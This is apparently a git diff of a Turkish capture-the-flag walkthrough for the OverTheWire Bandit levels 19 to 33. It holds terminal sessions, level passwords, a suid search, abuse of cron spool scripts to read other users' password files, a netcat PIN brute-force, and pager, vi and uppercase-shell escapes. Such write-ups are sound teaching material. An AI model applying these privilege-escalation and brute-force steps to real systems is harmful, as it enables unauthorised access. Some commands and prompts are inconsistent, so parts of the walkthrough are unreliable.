@@ -684,9 +684,13 @@ IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 
 ![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x")
 
-Bandit Level 18 → Level 19
+Bandit Level 19 → Level 20
 ======
 **_ssh bandit19@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+**suid:**  suid biti; herhangi bir programın herhangi bir kullanıcı tarafından bile, program sahibinin haklarıyla çalıştırılabilmesine olanak sağlamaktadır.
+
+**sgid:**  sgid biti; herhangi bir programın, grup hakları ile çalıştırılabileceğini göstermektedir.
 
 ```terminal
 bandit19@bandit:~$ ls -lah
@@ -716,24 +720,686 @@ bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
 
+suid ve sgid bitlerinin bulunması için aşağıdaki komut denenebilir:
+```terminal
+find / \( -perm -u+s -or -perm -g+s  \) -type f -exec ls -l {} \;
+```
+
 ![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "GbKksEFF4yrVs6il55v6gwY5aVje5f0j")
 
 
+Bandit Level 20 → Level 21
+======
+**_ssh bandit20@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+```terminal
+bandit20@bandit:~$ ls -lah
+total 32K
+drwxr-xr-x  2 root     root     4.0K Oct 16  2018 .
+drwxr-xr-x 41 root     root     4.0K Oct 16  2018 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rwsr-x---  1 bandit21 bandit20  12K Oct 16  2018 suconnect
+bandit20@bandit:~$ file suconnect
+suconnect: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74c0f6dc184e0412b6dc52e542782f43807268e1, not stripped
+```
+
+Çözüm için ikinci terminal açmak gerekmektedir. İlkine:
+
+```terminal
+bandit20@bandit:~$ nc -lvp 4646
+listening on [any] 4646 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 48384
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
+
+İkincisine:
+```terminal
+bandit20@bandit:~$ ./suconnect 4646
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+```
+
+![Nasıl mı?]https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/lvl20bandit.jpg
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr")
 
 
+Bandit Level 21 → Level 22
+======
+**_ssh bandit21@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+###### You should know
+
+**crontab:** used to install, deinstall or list the tables used to drive the cron(8) daemon in Vixie Cron.
+
+Hint;
+- /etc/cron.d/ 
+
+```terminal
+bandit21@bandit:~$ ls -lah /etc/cron.d/
+total 24K
+drwxr-xr-x  2 root root 4.0K Oct 16  2018 .
+drwxr-xr-x 88 root root 4.0K Aug  3 09:58 ..
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
+-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+```
+
+```terminal
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI")
 
 
+Bandit Level 22 → Level 23
+======
+**_ssh bandit22@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
 
 
+```terminal
+bandit22@bandit:~$ ls -lah
+total 20K
+drwxr-xr-x  2 root root 4.0K Oct 16  2018 .
+drwxr-xr-x 41 root root 4.0K Oct 16  2018 ..
+-rw-r--r--  1 root root  220 May 15  2017 .bash_logout
+-rw-r--r--  1 root root 3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root root  675 May 15  2017 .profile
+bandit22@bandit:~$ cd /etc/cron.d
+bandit22@bandit:/etc/cron.d$ ls -lah
+total 24K
+drwxr-xr-x  2 root root 4.0K Oct 16  2018 .
+drwxr-xr-x 88 root root 4.0K Aug  3 09:58 ..
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
+-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
+-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/etc/cron.d$ whoami
+bandit22
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum |cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n")
+
+Bandit Level 23 → Level 24
+======
+**_ssh bandit23@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+Hint;
+-  create your own first shell-script
+
+```terminal
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
 
 
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/yesil01
+bandit23@bandit:/tmp/yesil01$ touch yesil.sh
+bandit23@bandit:/tmp/yesil01$ chmod 777 yesil.sh
+bandit23@bandit:/tmp/yesil01$ vi yesil.sh
+bandit23@bandit:/tmp/yesil01$ cat yesil.sh
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 >> /tmp/yesil01/
+bandit23@bandit:/tmp/yesil01$ chmod 777 /tmp/yesil01
+bandit23@bandit:/tmp/yesil01$ cp yesil.sh /var/spool/bandit24/
+```
+
+1-2 iki dakika bekleyiniz.
+
+```termimal
+bandit23@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    2 bandit23 root     4.0K Nov  4 09:32 .
+drwxrws-wt 1903 root     root     3.9M Nov  4 09:32 ..
+-rw-r--r--    1 bandit24 bandit24   33 Nov  4 09:32 bandit24
+-rwxrwxrwx    1 bandit23 root       67 Nov  4 09:30 yesil.sh
+bandit23@bandit:/tmp/yesil01$ cat bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ")
+
+Bandit Level 24 → Level 25
+======
+**_ssh bandit24@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+Hint;
+- the password for bandit24 and a secret numeric 4-digit pincode 
+30002 portu için brute force atak yapılması gerekmektedir. Öncelikle python3 ile iki parça halinde wordlist oluşturulur.
+
+```python
+a = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ".join(['{0:04} \n'.format(num) for num in range(0, 5000)])  
+open("1.txt","w").write(a)
+a = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ".join(['{0:04} \n'.format(num) for num in range(5000, 10000)])  
+open("2.txt","w").write(a)
+```
+
+sonrasında ise;
+
+```terminal
+bandit24@bandit:/tmp/yesil01$  nc localhost 30002 < 1.txt  | grep -v "Wrong" 
+...
+bandit24@bandit:/tmp/yesil01$  nc localhost 30002 < 2.txt  | grep -v "Wrong" 
+Wrong! Please enter the correct pincode. Try again.                                                                         Wrong! Please enter the correct pincode. Try again.                                                                         Wrong! Please enter the correct pincode. Try again.                                                                         Wrong! Please enter the correct pincode. Try again.                                                                         Wrong! Please enter the correct pincode. Try again.                                                                         Correct!                                                                                                                    The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG  
+```
+
+komutları ile çözüme ulaşılır.
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG")
+
+Bandit Level 25 → Level 26
+======
+**_ssh bandit25@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+```terminal
+bandit25@bandit:~$ ls -lah
+total 32K
+drwxr-xr-x  2 root     root     4.0K Oct 29 20:40 .
+drwxr-xr-x 41 root     root     4.0K Oct 16  2018 ..
+-rw-r-----  1 bandit25 bandit25   33 Oct 29 20:40 .bandit24.password
+-r--------  1 bandit25 bandit25 1.7K Oct 16  2018 bandit26.sshkey
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3.5K May 15  2017 .bashrc
+-rw-r-----  1 bandit25 bandit25    4 Oct 29 20:40 .pin
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+bandit25@bandit:~$ cat bandit26.sshkey
+```
+
+```terminal
+bandit25@bandit:~$ cat /etc/passwd
+bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
+bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
+bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
+bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
+bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash
+bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
+bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash
+bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash
+bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
+bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash
+bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
+bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
+bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
+```
+
+```terminal
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+  Enjoy your stay!
+
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+Connection to localhost closed.
+```
+
+```terminal
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+
+Şu [linkte](https://linux.die.net/man/1/more) yer aldığı gibi _more_ komutunun man page i incelendiğinde vi editöre geçilebildiği görülmektedir. Vi editöründe komut çalıştırmak için ":ls" veya ":!ls" yazıldığında sonuç görülecektir.
+_cat /etc/bandit_pass/bandit26_ okunmaya çalışılırsa password elde edilecektir.
+
+Farklı bir yöntem ise: _:set shell sh=/bin/bash_ yazılır ve sonrasın _:sh_ yazılırsa vi kapanıp shell gelecektir.
+
+```terminal
+$ ls -lah
+total 36K
+drwxr-xr-x  3 root     root     4.0K Oct 16  2018 .
+drwxr-xr-x 41 root     root     4.0K Oct 16  2018 ..
+-rwsr-x---  1 bandit27 bandit26 7.2K Oct 16  2018 bandit27-do
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+drwxr-xr-x  2 root     root     4.0K Oct 16  2018 .ssh
+-rw-r-----  1 bandit26 bandit26  258 Oct 16  2018 text.txt
+$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z")
+
+Bandit Level 26 → Level 27
+======
+**bir önceki terminalden devam ederek;** dizin içerisindeki dosyalar listelendiğinde bandit27-do dosyası gözükmektedir.
+
+```terminal
+bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do id
+uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+bandit26@bandit:~$ ./bandit27-do whoami
+bandit27
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "3ba3118a22e93127a4ed485be72ef5ea")
+
+Bandit Level 27 → Level 28
+======
+**_ssh bandit27@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu. _tmp_ içerisindeki dizine gidilip soruda verilen bağlantı kullanılarak git clone edilir.
+
+###### You should now
+
+**git:**  Git is a fast, scalable, distributed revision control system
+
+**clone:** parametresiyle yeni bir directory içerisine repositoryi clone edilmiştir.
+
+```terminal
+bandit27@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    2 bandit23 root 4.0K Nov  4 14:15 .
+drwxrws-wt 1999 root     root 3.9M Nov  4 14:15 ..
+bandit27@bandit:/tmp/yesil01$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27-git@localhost's password:
+remote: Counting objects: 3, done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (3/3), done.
+```
 
 
+```terminal
+bandit27@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    3 bandit23 root     4.0K Nov  4 14:16 .
+drwxrws-wt 2000 root     root     3.9M Nov  4 14:17 ..
+drwxr-xr-x    3 bandit27 bandit27 4.0K Nov  4 14:16 repo
+bandit27@bandit:/tmp/yesil01/repo$ ls -lah
+total 16K
+drwxr-xr-x 3 bandit27 bandit27 4.0K Nov  4 14:16 .
+drwxrwxrwx 3 bandit23 root     4.0K Nov  4 14:16 ..
+drwxr-xr-x 8 bandit27 bandit27 4.0K Nov  4 14:16 .git
+-rw-r--r-- 1 bandit27 bandit27   68 Nov  4 14:16 README
+bandit27@bandit:/tmp/yesil01/repo$ cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+```
 
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "0ef186ac70e04ea33b4c1853d2526fa2")
 
+Bandit Level 28 → Level 29
+======
+**_ssh bandit28@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
 
+```terminal
+bandit27@bandit:/tmp/yesil01$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? ye
+Please type 'yes' or 'no': yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
 
+bandit28-git@localhost's password:
+remote: Counting objects: 9, done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 9 (delta 2), reused 0 (delta 0)
+Receiving objects: 100% (9/9), done.
+Resolving deltas: 100% (2/2), done.
+bandit27@bandit:/tmp/yesil01$ ls =lah
+ls: cannot access '=lah': No such file or directory
+bandit27@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    3 bandit23 root     4.0K Nov  4 14:23 .
+drwxrws-wt 2000 root     root     3.9M Nov  4 14:23 ..
+drwxr-xr-x    3 bandit27 bandit27 4.0K Nov  4 14:23 repo
+bandit27@bandit:/tmp/yesil01/repo$ cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
 
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+bandit27@bandit:/tmp/yesil01/repo$ cd .git/
+bandit27@bandit:/tmp/yesil01/repo$ git checkout
+bandit27@bandit:/tmp/yesil01/repo/.git$ git show
+commit 073c27c130e6ee407e12faad1dd3848a110c4f95
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    fix info leak
+
+diff --git a/README.md b/README.md
+index 3f7cee8..5c6457b 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+
+ - username: bandit29
+-- password: bbc96594b4e001778eee9975372716b2
++- password: xxxxxxxxxx
+
+bandit27@bandit:/tmp/yesil01/repo/.git$    
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "bbc96594b4e001778eee9975372716b2")
+
+Bandit Level 29 → Level 30
+======
+**_ssh bandit29@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+```terminal
+bandit27@bandit:/tmp/yesil01$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit29-git@localhost's password:
+remote: Counting objects: 16, done.
+remote: Compressing objects: 100% (11/11), done.
+remote: Total 16 (delta 2), reused 0 (delta 0)
+Receiving objects: 100% (16/16), done.
+Resolving deltas: 100% (2/2), done.
+bandit27@bandit:/tmp/yesil01/repo$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+bandit27@bandit:/tmp/yesil01/repo$ ls -lah
+total 16K
+drwxr-xr-x 3 bandit27 bandit27 4.0K Nov  4 14:31 .
+drwxrwxrwx 3 bandit23 root     4.0K Nov  4 14:31 ..
+drwxr-xr-x 8 bandit27 bandit27 4.0K Nov  4 14:31 .git
+-rw-r--r-- 1 bandit27 bandit27  131 Nov  4 14:31 README.md
+bandit27@bandit:/tmp/yesil01/repo$ git status
+On branch master
+Your branch is up-to-date with 'origin/master'.
+nothing to commit, working tree clean
+bandit27@bandit:/tmp/yesil01/repo$ git branch -r
+  origin/HEAD -> origin/master
+  origin/dev
+  origin/master
+  origin/sploits-dev
+bandit27@bandit:/tmp/yesil01/repo$ git checkout origin/dev
+Note: checking out 'origin/dev'.
+
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by performing another checkout.
+
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -b with the checkout command again. Example:
+
+  git checkout -b <new-branch-name>
+
+HEAD is now at 33ce2e9... add data needed for development
+bandit27@bandit:/tmp/yesil01/repo$ git status
+HEAD detached at origin/dev
+nothing to commit, working tree clean
+bandit27@bandit:/tmp/yesil01/repo$ ls -lah
+total 20K
+drwxr-xr-x 4 bandit27 bandit27 4.0K Nov  4 14:37 .
+drwxrwxrwx 3 bandit23 root     4.0K Nov  4 14:31 ..
+drwxr-xr-x 2 bandit27 bandit27 4.0K Nov  4 14:37 code
+drwxr-xr-x 8 bandit27 bandit27 4.0K Nov  4 14:37 .git
+-rw-r--r-- 1 bandit27 bandit27  134 Nov  4 14:37 README.md
+bandit27@bandit:/tmp/yesil01/repo$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+```
+
+İlk ls komutunun çıktısı ile son ls komutu çıktısı arasında fark görülmektedir. "code" adlı directory yer almıştır. "README" içerisinde de password yazmaktadır. Aslında aynı repoda iken branch listelenmiş "origin/dev"e geçilmiştir.
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "5b90576bedb2cc04c86a9e924ce42faf")
+
+Bandit Level 30 → Level 31
+======
+**_ssh bandit30@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+**tag:**  git-tag - Create, list, delete or verify a tag object signed with GPG
+
+```terminal
+bandit27@bandit:/tmp/yesil01$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit30-git@localhost's password:
+remote: Counting objects: 4, done.
+remote: Total 4 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (4/4), done.
+bandit27@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    3 bandit23 root     4.0K Nov  4 14:44 .
+drwxrws-wt 2006 root     root     3.9M Nov  4 14:45 ..
+drwxr-xr-x    3 bandit27 bandit27 4.0K Nov  4 14:45 repo
+bandit27@bandit:/tmp/yesil01/repo$ git tag
+secret
+bandit27@bandit:/tmp/yesil01/repo$ git show secret
+47e603bb428404d265f59c42920d81e5
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "47e603bb428404d265f59c42920d81e5")
+
+Bandit Level 31 → Level 32
+======
+**_ssh bandit31@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+```terminal
+bandit27@bandit:/tmp/yesil01$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password:
+remote: Counting objects: 4, done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 4 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (4/4), done.
+bandit27@bandit:/tmp/yesil01$ ls -lah
+total 3.9M
+drwxrwxrwx    3 bandit23 root     4.0K Nov  4 14:48 .
+drwxrws-wt 2007 root     root     3.9M Nov  4 14:48 ..
+drwxr-xr-x    3 bandit27 bandit27 4.0K Nov  4 14:48 repo
+bandit27@bandit:/tmp/yesil01/repo$ cat README.md
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+bandit27@bandit:/tmp/yesil01/repo$ echo "May I come in?" > key.txt
+bandit27@bandit:/tmp/yesil01/repo$ cat key.txt
+May I come in?
+bandit31@bandit:/tmp/yesil01/repo2$ rm .gitignore
+bandit31@bandit:/tmp/yesil01/repo2$ git branch
+* (HEAD detached at origin/master)
+  master
+bandit31@bandit:/tmp/yesil01/repo2$ git add key.txt
+The following paths are ignored by one of your .gitignore files:
+key.txt
+Use -f if you really want to add them.
+bandit31@bandit:/tmp/yesil01/repo2$ git add -f key.txt
+bandit31@bandit:/tmp/yesil01/repo2$ git commit -m "John Gkmn"
+[detached HEAD da681e4] John Gkmn
+ 1 file changed, 1 insertion(+)
+ create mode 100644 key.txt
+ bandit31@bandit:/tmp/yesil2/repo$ git push origin master
+Could not create directory '/home/bandit31/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password:
+Counting objects: 3, done.
+Delta compression using up to 4 threads.
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 320 bytes | 0 bytes/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+remote: ### Attempting to validate files... ####
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+remote: Well done! Here is the password for the next level:
+remote: 56a9bf19c63d650ce78e6ec0354ee45e
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:v
+To ssh://localhost/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
+```
+
+![password](https://raw.githubusercontent.com/JohnGkmn/JohnGkmn.github.io/master/css/smashicons.png "56a9bf19c63d650ce78e6ec0354ee45e")
+
+Bandit Level 32 → Level 33
+======
+**_ssh bandit32@bandit.labs.overthewire.org -p 2220_** password bir önceki seviyede bulunmuştu.
+
+```terminal
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us through IRC on
+  irc.overthewire.org #wargames.
+
+WELCOME TO THE UPPERCASE SHELL
+```
+
+```terminal
+>> pwd
+sh: 1: PWD: not found
+>> whoami
+sh: 1: WHOAMI: not found
+>> ls
+sh: 1: LS: not found
+>> echo "king"
+sh: 1: ECHO: not found
+>> ls
+sh: 1: LS: not found
+>> ls: ls
+sh: 1: LS:: not found
+>> ls; ls
+sh: 1: LS: not found
+sh: 1: LS: not found
+>> ls; ls^
+sh: 1: LS: not found
+sh: 1: LS^: not found
+>> ls; ls^^
+sh: 1: LS: not found
+sh: 1: LS^^: not found
+>> &0
+sh: 1: Syntax error: "&" unexpected
+>> $0
+$ ls
+uppershell
+$ ls -lah
+total 28K
+drwxr-xr-x  2 root     root     4.0K Oct 16  2018 .
+drwxr-xr-x 41 root     root     4.0K Oct 16  2018 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rwsr-x---  1 bandit33 bandit32 7.4K Oct 16  2018 uppershell
+```
+
+```terminal
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+```
+
